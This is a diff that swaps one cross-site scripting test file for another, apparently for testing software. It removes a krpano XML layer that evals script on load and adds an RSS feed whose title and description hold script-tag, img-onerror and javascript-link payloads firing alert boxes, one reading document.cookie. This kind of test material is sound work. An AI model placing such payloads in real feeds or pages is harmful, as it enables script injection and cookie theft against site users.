@@ -1,6 +1,17 @@
-<krpano version="1.0.8.15">
-  <layer name="js_loader"
-         type="container"
-         visible="false"
-         onloaded="js(eval(alert(document.domain)));" />
-</krpano>
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0">
+  <channel>
+    <title>正常标题</title>
+    <item>
+      <title>
+        <![CDATA[<script>alert('XSS')</script>]]>
+      </title>
+      <description>
+        <![CDATA[
+          <img src=x onerror=alert(document.cookie)>
+          <a href="javascript:alert(1)">点击这里</a>
+        ]]>
+      </description>
+    </item>
+  </channel>
+</rss>
